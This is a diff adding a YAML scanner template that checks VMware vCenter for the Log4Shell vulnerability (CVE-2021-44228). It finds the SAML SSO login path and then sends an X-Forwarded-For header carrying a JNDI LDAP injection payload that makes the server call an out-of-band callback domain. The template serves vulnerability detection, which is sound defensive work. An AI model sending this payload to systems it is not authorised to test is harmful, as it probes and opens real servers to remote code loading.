@@ -1,0 +1,28 @@
+name: VMware_vCenter_Log4shell_CVE_2021_44228_1
+transport: http
+set:
+  reverse: newReverse()
+  reverseDomain: reverse.domain
+detail:
+  dock: (app="VMware-vCenter" | body="vsphere-client/" | title="VMware vSphere")
+  product: VMware vCenter
+  homepage: https://www.vmware.com/
+  impact: ''
+  description: vsphere-client /websso/SAML2/SSO/地址存在log4j漏洞。
+rules:
+  r1:
+    method: GET
+    path: /ui/login
+    follow_redirects: false
+    output:
+      search_vmid: r'(?P<vmid>/websso/SAML2/SSO/.*SAMLRequest=)'.bsubmatch(response.raw_header)
+      var_vmid: search_vmid['vmid']
+    expression: response.status == 302
+  r2:
+    method: GET
+    path: '{{var_vmid}}'
+    follow_redirects: false
+    headers:
+      X-Forwarded-For: ${jndi:ldap://{{reverseDomain}}/tea}
+    expression: reverse.wait(5)
+expression: r1() && r2()
